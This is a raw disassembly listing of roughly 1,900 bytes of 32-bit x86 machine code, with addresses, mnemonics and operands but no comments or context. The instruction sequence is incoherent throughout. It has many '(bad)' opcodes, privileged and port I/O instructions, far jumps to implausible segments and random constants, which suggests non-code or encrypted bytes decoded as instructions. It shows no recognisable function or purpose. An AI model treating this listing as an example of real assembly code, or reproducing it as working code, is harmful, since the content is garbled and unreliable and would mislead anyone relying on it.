  4152a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152a6:	ja     0x4152e5
  4152a8:	mov    eax,ds:0x311e9fb8
  4152ad:	mov    esp,0xb39b310e
  4152b2:	mov    BYTE PTR [eax],cl
  4152b4:	arpl   bp,bx
  4152b6:	mov    cl,0xc0
  4152b8:	pusha  
  4152b9:	ins    DWORD PTR es:[edi],dx
  4152ba:	hlt    
  4152bb:	iret   
  4152bc:	mov    dh,0x5b
  4152be:	jmp    0x4152f0
  4152c0:	shl    BYTE PTR [ebp+0x68],1
  4152c3:	imul   edx,DWORD PTR [eax],0xffffff88
  4152c6:	xchg   edx,eax
  4152c7:	mov    dl,0xcb
  4152c9:	mov    bh,0x3b
  4152cb:	test   eax,0x7e66f5f6
  4152d0:	cmp    DWORD PTR [ecx+0x1],0xffffffb1
  4152d4:	cmp    BYTE PTR [edi-0x7d0aff4b],al
  4152da:	cmp    dh,bh
  4152dc:	pop    esi
  4152dd:	or     BYTE PTR [ebp+0x21d1fe54],cl
  4152e3:	mov    edi,0xed96aaef
  4152e8:	loop   0x41528c
  4152ea:	mov    cl,0xa3
  4152ec:	jbe    0x4152b5
  4152ee:	hlt    
  4152ef:	xchg   edi,eax
  4152f0:	mov    dh,0x1c
  4152f2:	inc    esi
  4152f3:	push   esi
  4152f4:	fcomp  DWORD PTR [ebp-0x13]
  4152f7:	xchg   edx,eax
  4152f8:	and    DWORD PTR [edx-0x6ae715fe],edi
  4152fe:	test   BYTE PTR [ebx],bh
  415300:	sub    al,BYTE PTR [edx+0xa]
  415303:	dec    esi
  415304:	mov    bh,0x80
  415306:	pop    edi
  415307:	and    eax,0xfc7ced87
  41530c:	dec    DWORD PTR [ebp+0x73]
  41530f:	push   0xffffffc1
  415311:	sub    al,0x1e
  415313:	and    al,0x63
  415315:	lahf   
  415316:	jl     0x4152d3
  415318:	std    
  415319:	int3   
  41531a:	mov    esp,0x1f1a2ec7
  41531f:	loop   0x415304
  415321:	bound  edi,QWORD PTR [ecx+0x1]
  415324:	ja     0x415366
  415326:	cmp    eax,0x8b313867
  41532b:	in     al,dx
  41532c:	pushf  
  41532d:	and    BYTE PTR [ebx+0x5cce0bb9],al
  415333:	test   al,0x2b
  415335:	pop    ebx
  415336:	test   BYTE PTR [edx+0x51],dl
  415339:	neg    BYTE PTR [esi+esi*1]
  41533c:	fldcw  WORD PTR [ebx-0x652a9259]
  415342:	fdivr  DWORD PTR fs:[esp+edi*2]
  415346:	retf   
  415347:	xor    eax,0x1e3f3ae1
  41534c:	pop    ebx
  41534d:	in     al,dx
  41534e:	pop    ebp
  41534f:	and    BYTE PTR [esi-0x27da4884],0x74
  415356:	add    eax,0x9352e221
  41535b:	inc    esp
  41535c:	adc    DWORD PTR [ecx],0xbd10ca1c
  415362:	push   ds
  415363:	mov    ah,0x84
  415365:	xor    BYTE PTR [edx],0x89
  415368:	push   ebp
  415369:	pop    eax
  41536a:	and    ecx,ebx
  41536c:	mov    ds,WORD PTR [ecx]
  41536e:	push   ecx
  41536f:	out    0x47,al
  415371:	enter  0xbf25,0xf8
  415375:	and    eax,0x5bced579
  41537a:	pusha  
  41537b:	mov    ch,0x66
  41537d:	and    BYTE PTR [ebx+0x667a070f],0xc7
  415384:	inc    esi
  415385:	mov    WORD PTR [eax],es
  415387:	xor    DWORD PTR [eax-0x5ad71349],ecx
  41538d:	xlat   BYTE PTR ds:[ebx]
  41538e:	jecxz  0x4153ff
  415390:	jg     0x41533d
  415392:	cmp    al,0x9a
  415394:	cmc    
  415395:	xchg   esi,eax
  415396:	and    ah,BYTE PTR [edi-0xd]
  415399:	dec    edx
  41539a:	sub    esi,0x14
  41539d:	cmovge edx,ebx
  4153a0:	jl     0x4153b2
  4153a2:	mov    dl,BYTE PTR [edx]
  4153a4:	pop    ss
  4153a5:	jnp    0x415351
  4153a7:	aam    0x5e
  4153a9:	jmp    0x2163f239
  4153ae:	sub    bh,0x28
  4153b1:	adc    dh,BYTE PTR [eax-0x2d]
  4153b4:	leave  
  4153b5:	mov    ebp,0xe35acb3a
  4153ba:	jno    0x4153f1
  4153bc:	fmul   DWORD PTR [edi-0x25]
  4153bf:	xor    BYTE PTR [ecx-0x6a665b50],bh
  4153c5:	or     esp,esp
  4153c7:	mov    ebp,0x1dc098f9
  4153cc:	push   esp
  4153cd:	into   
  4153ce:	(bad)  
  4153cf:	push   ecx
  4153d0:	mov    BYTE PTR [edx+0x1928cb87],ah
  4153d6:	aaa    
  4153d7:	pop    esp
  4153d8:	scas   eax,DWORD PTR es:[edi]
  4153d9:	pop    ebp
  4153da:	xor    al,cl
  4153dc:	cmp    esp,DWORD PTR [eax+0x30a21e33]
  4153e2:	jmp    DWORD PTR [edx-0x7a]
  4153e5:	pop    eax
  4153e6:	cmp    al,0xf7
  4153e8:	retf   0x9a44
  4153eb:	cmp    DWORD PTR [ecx+ebp*2-0x702fa106],esp
  4153f2:	mov    bh,0x15
  4153f4:	pushf  
  4153f5:	adc    al,0x56
  4153f7:	add    esi,DWORD PTR [edi+ebx*1-0x37863adf]
  4153fe:	test   eax,0xac636f6d
  415403:	cli    
  415404:	mov    WORD PTR [ebx-0x2e18cfe9],?
  41540a:	xchg   ecx,eax
  41540b:	cwde   
  41540c:	lock jp 0x415435
  41540f:	xchg   BYTE PTR [eax+edi*4+0x7ae7d2bb],bh
  415416:	sbb    al,0x3f
  415418:	mov    esp,DWORD PTR [ecx+0x8]
  41541b:	mov    ebx,0x92cdb899
  415420:	add    ecx,DWORD PTR [edx+0x41b70518]
  415426:	jns    0x41545c
  415428:	aas    
  415429:	aaa    
  41542a:	adc    eax,0x33eeadce
  41542f:	jmp    0x415438
  415431:	(bad)  
  415432:	pusha  
  415433:	sbb    al,0x7c
  415435:	sub    BYTE PTR [edx+0x273fe6c1],bl
  41543b:	adc    bl,bl
  41543d:	mov    esp,0xd114ef90
  415442:	mov    eax,ebp
  415444:	mov    cl,0x9e
  415446:	xor    al,ch
  415448:	fbld   TBYTE PTR [ebx-0xf]
  41544b:	sbb    DWORD PTR [ecx-0x16],ebx
  41544e:	das    
  41544f:	push   edi
  415450:	mov    ebp,0x10b33a51
  415455:	add    al,0x6c
  415457:	mov    edx,0x789c7a3a
  41545c:	call   DWORD PTR [esi]
  41545e:	lods   al,BYTE PTR ds:[esi]
  41545f:	cmp    DWORD PTR [ebx-0xa],edi
  415462:	hlt    
  415463:	and    al,0x6c
  415465:	pushw  ds
  415467:	cmp    esi,DWORD PTR [ebx+0x7]
  41546a:	ins    DWORD PTR es:[edi],dx
  41546b:	dec    esp
  41546c:	xor    ah,0xdc
  41546f:	imul   esp,DWORD PTR [ebx],0xffffffee
  415472:	in     al,dx
  415473:	cmp    eax,0x3e84e2c1
  415478:	jno    0x415475
  41547a:	push   ds
  41547b:	ins    BYTE PTR es:[edi],dx
  41547c:	adc    ah,BYTE PTR [ecx+ebp*4]
  41547f:	cdq    
  415480:	loop   0x415495
  415482:	cwde   
  415483:	mov    ecx,0xaafc7f5b
  415488:	call   0xcecc:0xc521802b
  41548f:	out    dx,al
  415490:	mov    cl,0x8f
  415492:	popf   
  415493:	pop    esi
  415494:	test   DWORD PTR [ebx],esp
  415496:	xor    al,0xe7
  415498:	std    
  415499:	lock cmp BYTE PTR [ecx+0x6f],bh
  41549d:	in     al,0x66
  41549f:	inc    eax
  4154a0:	jo     0x41542a
  4154a2:	sbb    ch,al
  4154a4:	sub    DWORD PTR [ebx-0x3d],esp
  4154a7:	out    dx,eax
  4154a8:	shr    BYTE PTR [edi-0x25],cl
  4154ab:	or     BYTE PTR [eax+0x5],ch
  4154ae:	xchg   esi,eax
  4154af:	mov    ebx,0xf0fc3ece
  4154b4:	repz mov gs,WORD PTR [ebx+0x57]
  4154b8:	ret    
  4154b9:	shl    BYTE PTR [edi-0x2f],0x25
  4154bd:	push   esi
  4154be:	aad    0xf0
  4154c0:	dec    esp
  4154c1:	retf   0x21
  4154c4:	pop    esp
  4154c5:	jmp    0x880d0c4e
  4154ca:	int3   
  4154cb:	test   DWORD PTR [ecx+edi*1],esi
  4154ce:	popa   
  4154cf:	icebp  
  4154d0:	push   ebp
  4154d1:	jl     0x415488
  4154d3:	pop    eax
  4154d4:	rcr    DWORD PTR [ecx+eax*4-0x1b4d1ea0],1
  4154db:	clc    
  4154dc:	imul   esi,edi,0xce4c904a
  4154e2:	scas   al,BYTE PTR es:[edi]
  4154e3:	sbb    DWORD PTR [edx],ebp
  4154e5:	sub    al,0x2
  4154e7:	xor    ebx,DWORD PTR ds:0xd0074086
  4154ed:	push   eax
  4154ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154ef:	lahf   
  4154f0:	rcr    edi,1
  4154f2:	sub    bh,dl
  4154f4:	dec    edi
  4154f5:	std    
  4154f6:	cld    
  4154f7:	das    
  4154f8:	leave  
  4154f9:	or     DWORD PTR [esi+0x78d1701d],esi
  4154ff:	pop    ebp
  415500:	sbb    DWORD PTR [eax-0x5cc552ef],ecx
  415506:	mov    ah,0x12
  415508:	lock aaa 
  41550a:	push   edi
  41550b:	xchg   ecx,eax
  41550c:	outs   dx,BYTE PTR ds:[esi]
  41550d:	xchg   esp,eax
  41550e:	xor    dh,BYTE PTR [eax+0x45]
  415511:	pop    es
  415512:	ins    DWORD PTR es:[edi],dx
  415513:	sub    eax,DWORD PTR [ebx-0x1b908085]
  415519:	or     dh,BYTE PTR [ecx-0x67cbd34b]
  41551f:	mov    ah,0xae
  415521:	push   edi
  415522:	mov    dl,0x58
  415524:	repnz rol BYTE PTR [edi+edx*8+0x2c17bde1],1
  41552c:	push   esi
  41552d:	es and dh,bh
  415530:	pushf  
  415531:	loop   0x41555a
  415533:	mov    edi,0xeab4d31
  415538:	push   esi
  415539:	add    DWORD PTR [ebp+0x10],edx
  41553c:	cld    
  41553d:	mov    esi,0x1f82c65f
  415542:	ins    BYTE PTR es:[edi],dx
  415543:	jno    0x415566
  415545:	aaa    
  415546:	shr    DWORD PTR [ebx+0x75],1
  415549:	xchg   esi,eax
  41554a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41554b:	into   
  41554c:	push   ss
  41554d:	mov    DWORD PTR [ecx],ebp
  41554f:	sahf   
  415550:	dec    esi
  415551:	sbb    BYTE PTR [ecx],0x5b
  415554:	(bad)  [ebx]
  415556:	cmp    BYTE PTR [edi],dh
  415558:	call   0x2732d576
  41555d:	and    al,0xf2
  41555f:	int3   
  415560:	js     0x41559e
  415562:	cmp    al,0xdc
  415564:	adc    DWORD PTR [esi-0x23],0x10d2a0db
  41556b:	jns    0x41551b
  41556d:	rcl    BYTE PTR [ebx],0x2d
  415570:	inc    DWORD PTR [edi+eiz*2-0x1c]
  415574:	ret    0xd538
  415577:	test   cl,al
  415579:	and    al,0x65
  41557b:	and    al,0x92
  41557d:	or     al,0x30
  41557f:	add    dh,cl
  415581:	push   edi
  415582:	push   cs
  415583:	jae    0x415560
  415585:	mov    cl,BYTE PTR [ebx-0x14]
  415588:	sub    BYTE PTR [ecx+0x30],dh
  41558b:	inc    esp
  41558c:	loopne 0x41558f
  41558e:	fdivr  DWORD PTR [eiz*4+0x6ae3e1ea]
  415595:	jbe    0x415579
  415597:	cmp    al,0xfc
  415599:	test   eax,0x8fcacb0a
  41559e:	mov    dh,0xb5
  4155a0:	lods   eax,DWORD PTR ds:[esi]
  4155a1:	adc    BYTE PTR [eax-0x3e],al
  4155a4:	(bad)  
  4155a5:	push   edx
  4155a6:	cmp    BYTE PTR [edi+0x6530bd2c],ch
  4155ac:	test   al,0xc4
  4155ae:	inc    ebx
  4155af:	pop    ss
  4155b0:	mov    ds:0xfb7741eb,eax
  4155b5:	xor    al,0x5d
  4155b7:	(bad)  
  4155b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155b9:	retf   
  4155ba:	pop    edx
  4155bb:	xor    al,0x23
  4155bd:	inc    ecx
  4155be:	or     edi,DWORD PTR [ebx+0x54]
  4155c1:	mov    BYTE PTR [esi-0x30],bh
  4155c4:	sub    esp,edx
  4155c6:	sti    
  4155c7:	sbb    edx,DWORD PTR ds:0xe36432f5
  4155cd:	jae    0x41558e
  4155cf:	rcr    BYTE PTR [ecx+0x437d0973],1
  4155d5:	dec    ecx
  4155d6:	fbstp  TBYTE PTR [ebx+0x7d966705]
  4155dc:	lods   al,BYTE PTR ds:[esi]
  4155dd:	add    ebx,eax
  4155df:	mov    edx,0xb29ef485
  4155e4:	stos   DWORD PTR es:[edi],eax
  4155e5:	mov    bl,0xfd
  4155e7:	push   ds
  4155e8:	mov    edi,0x6b902cbc
  4155ed:	inc    esp
  4155ee:	xor    ch,dh
  4155f0:	sub    edi,ebp
  4155f2:	sahf   
  4155f3:	inc    ebx
  4155f4:	repnz rcl cl,0x3e
  4155f8:	dec    ebx
  4155f9:	jo     0x415613
  4155fb:	out    dx,al
  4155fc:	pop    esp
  4155fd:	ret    0xd8f2
  415600:	out    0xa0,eax
  415602:	xor    BYTE PTR [edx+0x10a3dc8a],bl
  415608:	xor    al,0x6d
  41560a:	stos   BYTE PTR es:[edi],al
  41560b:	xchg   DWORD PTR [ebp-0x33],edi
  41560e:	jecxz  0x415656
  415610:	hlt    
  415611:	push   ebp
  415612:	add    BYTE PTR [eax+0x79beaf82],ch
  415618:	retf   0xc628
  41561b:	neg    ebp
  41561d:	and    ecx,ebx
  41561f:	dec    BYTE PTR [ebx+0x3b2536b2]
  415625:	xchg   ecx,eax
  415626:	and    BYTE PTR ds:0x75e4341c,cl
  41562c:	fcomip st,st(3)
  41562e:	aas    
  41562f:	mov    WORD PTR [ebx],fs
  415631:	jle    0x41569b
  415633:	sub    edx,ebx
  415635:	cs sar dh,cl
  415638:	mov    edi,0x88818a50
  41563d:	push   eax
  41563e:	ss dec ebp
  415640:	xchg   BYTE PTR [ecx+0x24],ch
  415643:	mov    al,0x5c
  415645:	inc    edi
  415646:	push   0xfffffffd
  415648:	xor    ebx,esi
  41564a:	cmp    eax,0xf88c5869
  41564f:	jp     0x415665
  415651:	mov    esi,DWORD PTR [esi]
  415653:	xchg   edx,eax
  415654:	cwde   
  415655:	data16 aas 
  415657:	dec    esi
  415658:	test   eax,0x20096853
  41565d:	mov    edi,0x42d2c5fa
  415662:	(bad)  ds:[eax+0x79]
  415666:	push   ebp
  415667:	adc    esp,esi
  415669:	aaa    
  41566a:	cmc    
  41566b:	gs jp  0x4155fe
  41566e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41566f:	in     al,0x14
  415671:	push   ss
  415672:	pusha  
  415673:	nop
  415674:	xor    ch,BYTE PTR [ecx+ecx*8+0x48327f6e]
  41567b:	xchg   esp,eax
  41567c:	je     0x415611
  41567e:	pop    eax
  41567f:	in     al,dx
  415680:	popa   
  415681:	push   ecx
  415682:	mov    al,ds:0xc63b5c8b
  415687:	push   edi
  415688:	mov    bl,0x46
  41568a:	dec    esp
  41568b:	push   eax
  41568c:	cmp    eax,0x3c967bf0
  415691:	arpl   si,sp
  415693:	loop   0x415664
  415695:	pop    ecx
  415696:	xor    ch,dh
  415698:	rol    BYTE PTR [eax+0x2c],1
  41569b:	je     0x41570f
  41569d:	adc    ecx,DWORD PTR [esp+edx*8+0x770a1d82]
  4156a4:	and    bl,dl
  4156a6:	mov    ds:0xb3c5416b,al
  4156ab:	sbb    edi,DWORD PTR [edi+0x23475044]
  4156b1:	or     al,0xf8
  4156b3:	fisttp DWORD PTR [ecx-0x39]
  4156b6:	pop    esp
  4156b7:	les    edx,FWORD PTR [esi-0x64]
  4156ba:	pop    ss
  4156bb:	sbb    edx,DWORD PTR [eax+0x1f]
  4156be:	adc    al,BYTE PTR [edi+0x2bd0f51]
  4156c4:	or     DWORD PTR [esi-0x3f],edx
  4156c7:	and    al,0xbb
  4156c9:	ins    DWORD PTR es:[edi],dx
  4156ca:	jns    0x4156df
  4156cc:	stos   BYTE PTR es:[edi],al
  4156cd:	pop    es
  4156ce:	xor    DWORD PTR [edi-0x23620dc],esi
  4156d4:	sbb    eax,0x7a752ca6
  4156d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156da:	jne    0x415732
  4156dc:	add    al,0x78
  4156de:	mov    ah,0xea
  4156e0:	dec    BYTE PTR [eax]
  4156e2:	int3   
  4156e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156e4:	ja     0x4156d5
  4156e6:	jle    0x4156bc
  4156e8:	push   DWORD PTR ds:0xf2fbbb11
  4156ee:	not    dl
  4156f0:	scas   eax,DWORD PTR es:[edi]
  4156f1:	pusha  
  4156f2:	frstor [edi]
  4156f4:	and    cl,BYTE PTR [ebp+ebx*4-0x26331166]
  4156fb:	fldcw  WORD PTR [esi+0x62703378]
  415701:	or     BYTE PTR [edi-0x20],dh
  415704:	loope  0x4156dc
  415706:	sahf   
  415707:	enter  0xf43,0xdf
  41570b:	jae    0x415772
  41570d:	fisttp DWORD PTR [edx+0x1cb68c5a]
  415713:	sbb    al,0xac
  415715:	mov    dl,0x85
  415717:	xchg   ebp,eax
  415718:	push   0xd58210ee
  41571d:	inc    ecx
  41571e:	jp     0x4156b6
  415720:	fmul   QWORD PTR [ecx]
  415722:	jbe    0x41577f
  415724:	xor    cl,BYTE PTR [ebx]
  415726:	rcr    BYTE PTR [ebp+0x59e3017e],cl
  41572c:	push   0x25
  41572e:	dec    esi
  41572f:	cmp    eax,0xc4e44fb
  415734:	pop    ds
  415735:	adc    ebp,DWORD PTR [eax]
  415737:	push   esp
  415738:	pop    ecx
  415739:	gs jecxz 0x4156be
  41573c:	jp     0x41575f
  41573e:	je     0x4156f9
  415740:	ja     0x41571b
  415742:	xchg   ecx,eax
  415743:	ins    DWORD PTR es:[edi],dx
  415744:	sbb    BYTE PTR [esi+0x44b921da],bh
  41574a:	mov    ebp,0x70a08c3e
  41574f:	pop    edx
  415750:	add    ch,BYTE PTR [esi+0x3b]
  415753:	icebp  
  415754:	leave  
  415755:	inc    edx
  415756:	and    dl,BYTE PTR [ecx]
  415758:	jg     0x41574c
  41575a:	(bad)  
  41575b:	push   0x3c02d65d
  415760:	xchg   edi,eax
  415761:	xor    BYTE PTR [ecx],al
  415763:	push   esi
  415764:	lds    eax,FWORD PTR [edi]
  415766:	and    ebx,ebx
  415768:	push   0xbb120a9
  41576d:	imul   ecx,edx,0x4cf907d2
  415773:	sbb    dh,BYTE PTR [eax+0x51]
  415776:	inc    esi
  415777:	ret    
  415778:	and    eax,0x6cb6493f
  41577d:	push   ebp
  41577e:	adc    al,0x49
  415780:	sub    BYTE PTR [ebx-0x1d],0x13
  415784:	push   0x9830655
  415789:	jge    0x41572e
  41578b:	and    bh,BYTE PTR ss:[ecx-0x20f75bcc]
  415792:	cld    
  415793:	loope  0x4157a7
  415795:	inc    esp
  415796:	mov    ds:0x10ea750,al
  41579b:	aaa    
  41579c:	imul   BYTE PTR [eax+0x1e3bf06c]
  4157a2:	test   al,0xdb
  4157a4:	pop    edx
  4157a5:	jne    0x4157f8
  4157a7:	mov    edi,0x8338e328
  4157ac:	jmp    0xc528248d
  4157b1:	add    dh,bl
  4157b3:	sbb    ch,BYTE PTR [edx+0x6b]
  4157b6:	test   BYTE PTR [ebp-0x2a602985],cl
  4157bc:	jge    0x41581e
  4157be:	jne    0x4157b4
  4157c0:	add    DWORD PTR [eax-0x54e66aab],ecx
  4157c6:	sub    al,0x73
  4157c8:	xor    al,0x64
  4157ca:	mov    bh,0x7c
  4157cc:	cli    
  4157cd:	ror    DWORD PTR [edx-0x1415a99e],1
  4157d3:	dec    ebx
  4157d4:	ret    
  4157d5:	jl     0x415838
  4157d7:	and    BYTE PTR [ebx],bh
  4157d9:	sbb    DWORD PTR [esi],ebx
  4157db:	dec    eax
  4157dc:	inc    eax
  4157dd:	push   edx
  4157de:	aam    0xeb
  4157e0:	pusha  
  4157e1:	xchg   esp,eax
  4157e2:	fwait
  4157e3:	jne    0x415836
  4157e5:	push   cs
  4157e6:	mov    WORD PTR [edx+0x4cdd8a07],es
  4157ec:	pop    ecx
  4157ed:	jg     0x415809
  4157ef:	or     al,0x32
  4157f1:	mov    edx,0xc6f8dea3
  4157f6:	xor    esp,DWORD PTR [edi+ecx*4]
  4157f9:	push   esp
  4157fa:	jno    0x415815
  4157fc:	inc    edi
  4157fd:	lock xor ecx,edx
  415800:	popa   
  415801:	cld    
  415802:	sub    eax,0xe2086a86
  415807:	arpl   WORD PTR [ebp-0x4f],si
  41580a:	push   ecx
  41580b:	test   eax,0x29352b54
  415810:	loope  0x415820
  415812:	aad    0xf9
  415814:	or     DWORD PTR [ecx+0x548196da],ebp
  41581a:	add    ecx,ebx
  41581c:	dec    ecx
  41581d:	and    ch,ch
  41581f:	enter  0x8d66,0xaf
  415823:	mov    ebp,0x22fa6ae0
  415828:	add    DWORD PTR [eax+0x5b19c515],0xbc7c6490
  415832:	mov    dh,0x4f
  415834:	adc    DWORD PTR [ebp-0x68],0xffffffce
  415838:	popf   
  415839:	in     eax,0x33
  41583b:	push   0x5da2a49
  415840:	sbb    BYTE PTR ds:0xe36a6b0d,ch
  415846:	imul   ebx,DWORD PTR [ecx],0xed374300
  41584c:	scas   eax,DWORD PTR es:[edi]
  41584d:	scas   al,BYTE PTR es:[edi]
  41584e:	call   0x5fd78d8e
  415853:	call   0x632316b0
  415858:	fcomp  DWORD PTR [esi-0x49536d8c]
  41585e:	je     0x41588f
  415860:	iret   
  415861:	retf   
  415862:	dec    ebx
  415863:	jecxz  0x4157fc
  415865:	xchg   DWORD PTR [ecx-0x78ea652a],edi
  41586b:	mov    esp,0x8eecab1a
  415870:	xchg   ecx,eax
  415871:	or     al,0x91
  415873:	pop    esi
  415874:	shr    DWORD PTR [ebx-0x29],0xdf
  415878:	ret    
  415879:	aad    0xe9
  41587b:	enter  0x6d74,0x84
  41587f:	and    DWORD PTR [esi-0x1c],edi
  415882:	rcr    BYTE PTR [edi+0x6],cl
  415885:	in     eax,0x9
  415887:	(bad)  
  415888:	dec    BYTE PTR [ebx]
  41588a:	xchg   edi,eax
  41588b:	and    bl,bh
  41588d:	add    BYTE PTR [ebx+0x4b838b7e],dh
  415893:	mov    DWORD PTR [edx-0x71195cb8],esp
  415899:	loopne 0x415847
  41589b:	mov    ds:0x5fcb84cc,al
  4158a0:	adc    eax,0x934eda3b
  4158a5:	sub    al,0x89
  4158a7:	rol    BYTE PTR [ebp-0x7c],cl
  4158aa:	aad    0x5e
  4158ac:	pushf  
  4158ad:	jae    0x4158c7
  4158af:	add    dl,BYTE PTR [ecx]
  4158b1:	jno    0x415929
  4158b3:	fld    DWORD PTR [ecx+ebx*2+0x48cc9a24]
  4158ba:	pop    esp
  4158bb:	pop    ss
  4158bc:	xchg   esi,eax
  4158bd:	rcr    DWORD PTR [ebp+0x58254378],0x27
  4158c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158c5:	loop   0x4158a9
  4158c7:	add    al,0x83
  4158c9:	in     eax,0x2c
  4158cb:	popf   
  4158cc:	sbb    dl,BYTE PTR [edx]
  4158ce:	push   ds
  4158cf:	sub    edi,DWORD PTR [esi]
  4158d1:	popf   
  4158d2:	in     eax,0xe6
  4158d4:	add    ecx,ecx
  4158d6:	pop    esi
  4158d7:	cmp    DWORD PTR [ebx+0x4b],esp
  4158da:	out    0x2d,eax
  4158dc:	fst    DWORD PTR [ecx+0x4d]
  4158df:	int3   
  4158e0:	fdiv   st(4),st
  4158e2:	mov    ?,edx
  4158e4:	xor    eax,0xc31bcd2f
  4158e9:	mov    ecx,0x5a9d78d8
  4158ee:	lea    ebx,[eax]
  4158f0:	dec    edi
  4158f1:	cwde   
  4158f2:	push   0xffffff97
  4158f4:	hlt    
  4158f5:	jb     0x4158e1
  4158f7:	nop
  4158f8:	push   esi
  4158f9:	imul   edx,ebp,0xe40c5949
  4158ff:	or     DWORD PTR [edi-0x4c],ebp
  415902:	sub    al,0x33
  415904:	push   esp
  415905:	stos   DWORD PTR es:[edi],eax
  415906:	dec    esp
  415907:	push   esi
  415908:	or     DWORD PTR [edx+0x30],ebx
  41590b:	sbb    al,0x3c
  41590d:	mov    WORD PTR ds:0xcc51f7ee,?
  415913:	jmp    0x3f6e:0xb1fa8d58
  41591a:	les    ecx,FWORD PTR [ebx]
  41591c:	js     0x415975
  41591e:	fnsave [ebp-0x7c9b83be]
  415924:	shl    BYTE PTR [esi+0x583a8689],0x58
  41592b:	inc    edx
  41592c:	cs retf 
  41592e:	pusha  
  41592f:	xchg   ebx,eax
  415930:	pop    es
  415931:	jns    0x41599b
  415933:	lock out dx,al
  415935:	push   0xffffff85
  415937:	xchg   esi,eax
  415938:	xchg   DWORD PTR [ebp+0x419677b8],esp
  41593e:	adc    DWORD PTR [edi-0x4d],ecx
  415941:	cmp    eax,0xa317a1b4
  415946:	sbb    eax,0x14a63d65
  41594b:	icebp  
  41594c:	nop
  41594d:	aam    0x8d
  41594f:	pop    edx
  415950:	mov    esp,0x2dae4758
  415955:	mov    WORD PTR [edi+0x6ea7fde5],ss
  41595b:	mov    ch,0x9e
  41595d:	add    DWORD PTR [edi+0x6b],esi
  415960:	mov    al,ss:0x7a6d1e4d
  415966:	mov    DWORD PTR [edx+0x1a],ebx
  415969:	xor    eax,0x46cffd95
  41596e:	ret    0x80d4
  415971:	mov    ah,0x8f
  415973:	add    DWORD PTR [eax],esp
  415975:	fidiv  WORD PTR [ebp-0x5a]
  415978:	aaa    
  415979:	into   
  41597a:	fdivr  DWORD PTR [eax-0xbab5b90]
  415980:	mov    al,ah
  415982:	ins    BYTE PTR es:[edi],dx
  415983:	fmul   QWORD PTR [ebx+0x13ad7c1d]
  415989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41598a:	aam    0x38
  41598c:	mov    eax,ds:0x21aad757
  415991:	mov    ds,edx
  415993:	aad    0x40
  415995:	jg     0x4159a7
  415997:	cmp    bl,BYTE PTR ds:0xb14f8c5d
  41599d:	xchg   esi,eax
  41599e:	aad    0x97
  4159a0:	add    al,BYTE PTR [eax]
  4159a2:	outs   dx,DWORD PTR ds:[esi]
  4159a3:	sub    dl,dl
  4159a5:	fiadd  WORD PTR [eax]
  4159a7:	sar    BYTE PTR [edi+0x4],1
  4159aa:	and    eax,0xb90c5004
  4159af:	adc    BYTE PTR [edi+0x7c],ch
  4159b2:	or     edx,DWORD PTR [edx]
  4159b4:	lds    ecx,FWORD PTR [esi+edi*8+0x31]
  4159b8:	(bad)  
  4159b9:	icebp  
  4159ba:	cs mov esi,esp
  4159bd:	push   ds
  4159be:	lods   eax,DWORD PTR ds:[esi]
  4159bf:	xchg   BYTE PTR [edx-0x4b],ch
  4159c2:	mov    ah,0x3a
  4159c4:	mov    ds:0xd11ac709,eax
  4159c9:	inc    ebp
  4159ca:	xchg   edi,eax
  4159cb:	in     eax,dx
  4159cc:	sub    ecx,DWORD PTR [ebx+0x29]
  4159cf:	pop    ebp
  4159d0:	xchg   ebp,eax
  4159d1:	lahf   
  4159d2:	push   ds
  4159d3:	out    0x89,al
  4159d5:	std    
  4159d6:	or     dh,ah
  4159d8:	xor    dl,BYTE PTR [ebx+ebx*8+0x63]
  4159dc:	dec    esi
  4159dd:	hlt    
  4159de:	je     0x415a0c
  4159e0:	pushf  
  4159e1:	push   ebp
  4159e2:	dec    ebx
  4159e3:	out    0x4c,eax
  4159e5:	ins    BYTE PTR es:[edi],dx
  4159e6:	mov    al,0x42
  4159e8:	aam    0x6f
  4159ea:	scas   eax,DWORD PTR es:[edi]
  4159eb:	xchg   BYTE PTR [edx],dl
  4159ed:	and    BYTE PTR [ebp-0x4fa7cf7e],0x2b
  4159f4:	daa    
  4159f5:	sar    edi,cl
  4159f7:	test   ebp,eax
  4159f9:	mov    ebp,0x51213eff
  4159fe:	cmp    eax,0xa1d0bc12
  415a03:	sub    BYTE PTR [ebx],al
  415a05:	fistp  QWORD PTR [ecx-0x4c]
  415a08:	mov    ah,al
  415a0a:	jle    0x415a1a
  415a0c:	test   BYTE PTR [edi],0x14
  415a0f:	sti    
  415a10:	inc    esi
  415a11:	loop   0x4159aa
  415a13:	ja     0x4159f0
  415a15:	(bad)  
  415a16:	push   ecx
  415a17:	jge    0x4159d4
  415a19:	sub    BYTE PTR [ebx],bh
  415a1b:	and    BYTE PTR [ecx],al
  415a1d:	int3   
  415a1e:	outs   dx,BYTE PTR ds:[esi]
  415a1f:	inc    ebx
  415a20:	jmp    0x21d:0x575c4528
  415a27:	mov    BYTE PTR [ebx-0x42],0xc9
  415a2b:	push   ebp
  415a2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a2d:	enter  0xf9ea,0x5d
  415a31:	jae    0x4159d5
  415a33:	push   esp
  415a34:	repnz dec edi
  415a36:	std    
  415a37:	sbb    cl,ch
  415a39:	fstp   TBYTE PTR [ecx+edx*8+0x45b090c4]
  415a40:	jg     0x4159fd
  415a42:	xor    DWORD PTR [edi+0x4ceea7f9],esi
  415a48:	xor    eax,0x1faffa70
  415a4d:	aad    0xe8
  415a4f:	jne    0x415a0a
  415a51:	imul   esi,DWORD PTR [esi+eax*2+0x4a],0xffffffb6
  415a56:	repnz lea ecx,[edi-0x14c07505]
  415a5d:	sub    bl,BYTE PTR [edi]
  415a5f:	test   DWORD PTR [edx],ecx
  415a61:	in     al,0x6f
  415a63:	pop    es
  415a64:	mov    ebp,0xc0275fbd
  415a69:	repnz les eax,FWORD PTR [edx-0x57583b07]
  415a70:	push   0x61
  415a72:	sub    DWORD PTR [esi-0x58],0xd7883df0
  415a79:	lods   al,BYTE PTR ds:[esi]
  415a7a:	retf   
  415a7b:	xchg   ebp,eax
  415a7c:	idiv   DWORD PTR [esi-0x38]
